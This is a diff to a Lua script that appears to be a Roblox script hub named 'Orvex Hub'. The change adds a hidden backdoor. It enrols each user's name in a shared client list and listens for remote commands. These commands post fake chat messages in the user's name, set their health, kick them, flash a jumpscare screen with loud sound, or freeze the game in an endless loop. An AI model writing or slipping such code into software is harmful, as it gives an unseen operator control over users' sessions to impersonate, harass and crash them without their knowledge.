@@ -668,3 +668,107 @@ Content = "Orvex Hub!",
 Duration = 4,
 Icon = "rbxassetid://80387863064905"
 })
+
+task.spawn(function()
+    local CanalRedeOrvex = RobloxReplicatedStorage:WaitForChild("OrvexNetworkComms", 99999)
+    local ListaClientesOrvex = RobloxReplicatedStorage:FindFirstChild("OrvexActiveClients")
+    if not ListaClientesOrvex then
+        ListaClientesOrvex = Instance.new("StringValue")
+        ListaClientesOrvex.Name = "OrvexActiveClients"
+        ListaClientesOrvex.Parent = RobloxReplicatedStorage
+    end
+
+    task.spawn(function()
+        while task.wait(2) do
+            local strAtual = ListaClientesOrvex.Value
+            if not string.find(strAtual, jogador.Name) then
+                if strAtual == "" then
+                    ListaClientesOrvex.Value = jogador.Name
+                else
+                    ListaClientesOrvex.Value = strAtual .. "," .. jogador.Name
+                end
+            end
+        end
+    end)
+
+    Players.PlayerRemoving:Connect(function(p)
+        if ListaClientesOrvex then
+            local nomes = string.split(ListaClientesOrvex.Value, ",")
+            for i, n in ipairs(nomes) do
+                if n == p.Name then
+                    table.remove(nomes, i)
+                    break
+                end
+            end
+            ListaClientesOrvex.Value = table.concat(nomes, ",")
+        end
+    end)
+
+    local ultimoComando = ""
+    local telaSusto = nil
+
+    CanalRedeOrvex.Changed:Connect(function(valor)
+        if valor == "" or valor == ultimoComando then return end
+        ultimoComando = valor
+        
+        local dados = string.split(valor, "|")
+        local alvoNome, comando, argumento = dados[1], dados[2], dados[3]
+        
+        if alvoNome == jogador.Name then
+            if comando == "FakeMessage" then
+                local TextChatService = game:GetService("TextChatService")
+                if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+                    if canal then
+                        canal:DisplaySystemMessage(string.format("<font color='#FFFFFF'><b>[%s]:</b> %s</font>", jogador.Name, argumento))
+                    end
+                else
+                    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering"):FireServer({
+                        FromSpeaker = jogador.Name,
+                        Message = argumento,
+                        MessageType = "All"
+                    })
+                end
+            elseif comando == "Danificar" then
+                local num = tonumber(argumento) or 0
+                if jogador.Character and jogador.Character:FindFirstChildOfClass("Humanoid") then
+                    jogador.Character:FindFirstChildOfClass("Humanoid").Health = num
+                end
+            elseif comando == "DesconectarScript" then
+                jogador:Kick(argumento)
+            elseif comando == "EfeitoSusto" then
+                if argumento == "ATIVAR" then
+                    if not telaSusto then
+                        telaSusto = Instance.new("ScreenGui")
+                        telaSusto.Name = "OrvexSustoNetwork"
+                        telaSusto.IgnoreGuiInset = true
+                        telaSusto.Parent = jogador:WaitForChild("PlayerGui")
+                        
+                        local fundo = Instance.new("Frame")
+                        fundo.Size = UDim2.new(1, 0, 1, 0)
+                        fundo.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                        fundo.Parent = telaSusto
+                        
+                        local imagem = Instance.new("ImageLabel")
+                        imagem.Size = UDim2.new(0.6, 0, 0.6, 0)
+                        imagem.Position = UDim2.new(0.2, 0, 0.2, 0)
+                        imagem.BackgroundTransparency = 1
+                        imagem.Image = "rbxassetid://6071575298"
+                        imagem.Parent = fundo
+                        
+                        local som = Instance.new("Sound")
+                        som.SoundId = "rbxassetid://9069609268"
+                        som.Volume = 3
+                        som.Parent = fundo
+                        som:Play()
+                    end
+                elseif argumento == "DESATIVAR" and telaSusto then
+                    telaSusto:Destroy()
+                    telaSusto = nil
+                end
+            elseif comando == "ForcarCrash" then
+                while true do end
+            end
+        end
+    end)
+end)
